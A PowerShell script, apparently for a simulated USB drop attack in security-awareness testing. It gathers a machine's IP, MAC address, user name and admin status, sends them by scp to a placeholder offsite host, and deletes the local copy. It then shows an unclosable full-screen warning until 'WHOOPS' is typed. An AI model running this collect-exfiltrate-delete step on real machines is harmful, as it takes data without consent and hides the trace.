#Get IP address
$ipAddress = (Get-NetIPAddress -InterfaceAlias "Ethernet" | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress 

#Get the MAC address of the Ethernet interface
$macAddress = (Get-NetAdapter -Name "Ethernet").MacAddress

#Get the current user
$currentUser = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name

#Get system information
$systemInfo = Get-ComputerInfo

#Get the current time
$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

#Check if the user has administrator access
$userIsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

#Combine all information into a single string
$info = @"
IP Address: $ipAddress
MAC Address: $macAddress
User: $currentUser
Current Time: $currentTime
User Is Admin: $userIsAdmin
"@ >> #Uncomment once changed to match the pathing where you want the file to be saved C:\Users\Username\Desktop\Folder\File

#Change first to public key of offsite computer or VM, second to the location of above saved file and third being the location you want to send the file to on the offsite computer or VM
scp -i C:\Users\Username\.ssh\pub-key C:\Users\Username\Desktop\Folder\File Username@ip.address.of.computer:/home/Username/Folder

#Delete text file
Remove-Item C:\Users\Username\Desktop\Folder\File

# Load Windows Forms and Drawing assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Get the screen size
$screen = [System.Windows.Forms.Screen]::PrimaryScreen
$screenWidth = $screen.Bounds.Width
$screenHeight = $screen.Bounds.Height

# Create a new Form
$form = New-Object System.Windows.Forms.Form
$form.Text = "Simulated USB Drop Attack"
$form.BackColor = [System.Drawing.Color]::Red
$form.Size = New-Object System.Drawing.Size($screenWidth, $screenHeight)
$form.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
$form.Location = New-Object System.Drawing.Point(0, 0)
$form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
$form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized

# Create a Label for instructions
$label = New-Object System.Windows.Forms.Label
$label.Text = "You have connected an unauthorized USB device to this machine as part of a simulated USB drop attack.`nPlease enter 'WHOOPS' to close this window."
$label.ForeColor = [System.Drawing.Color]::White
$label.Font = New-Object System.Drawing.Font("Arial", 18, [System.Drawing.FontStyle]::Bold)
$label.BackColor = [System.Drawing.Color]::Transparent
$label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter

# Manually adjust the label size
$label.AutoSize = $false
$label.Width = 800
$label.Height = 100
$label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter

# Create a TextBox for user input
$textBox = New-Object System.Windows.Forms.TextBox
$textBox.Width = 260
$textBox.Font = New-Object System.Drawing.Font("Arial", 16)
$textBox.TextAlign = [System.Windows.Forms.HorizontalAlignment]::Center

# Calculate positions to center the controls
$textBox.Left = ($screenWidth / 2) - ($textBox.Width / 2)
$textBox.Top = ($screenHeight / 2) - ($textBox.Height / 2)
$label.Left = ($screenWidth / 2) - ($label.Width / 2)
$label.Top = $textBox.Top - $label.Height - 20

# Create a close button
$button = New-Object System.Windows.Forms.Button
$button.Text = "Close"
$button.Size = New-Object System.Drawing.Size(100, 40)
$button.BackColor = [System.Drawing.Color]::Red
$button.ForeColor = [System.Drawing.Color]::White
$button.Font = New-Object System.Drawing.Font("Arial", 14)
$button.Left = ($screenWidth / 2) - ($button.Width / 2)
$button.Top = $textBox.Top + $textBox.Height + 20

# Add an event handler for the TextBox to close the form
$textBox.Add_KeyDown({
    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
        if ($textBox.Text -ceq "WHOOPS") {
            $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
            $form.Close()
        } else {
            [System.Windows.Forms.MessageBox]::Show("Incorrect input. Please enter 'WHOOPS' exactly to close this window.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
        }
    }
})

# Add an event handler for the button to close the form
$button.Add_Click({
    if ($textBox.Text -ceq "WHOOPS") {
        $form.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $form.Close()
    } else {
        [System.Windows.Forms.MessageBox]::Show("Incorrect input. Please enter 'WHOOPS' exactly to close this window.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
})

# Add controls to the form
$form.Controls.Add($label)
$form.Controls.Add($textBox)
$form.Controls.Add($button)

# Override the Form's closing event to prevent closing the window
$form.Add_FormClosing({
    if ($form.DialogResult -ne [System.Windows.Forms.DialogResult]::OK) {
        $_.Cancel = $true
        [System.Windows.Forms.MessageBox]::Show("Incorrect input. Please enter 'WHOOPS' exactly to close this window.", "Error", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error)
    }
})

# Show the form
[System.Windows.Forms.Application]::Run($form)
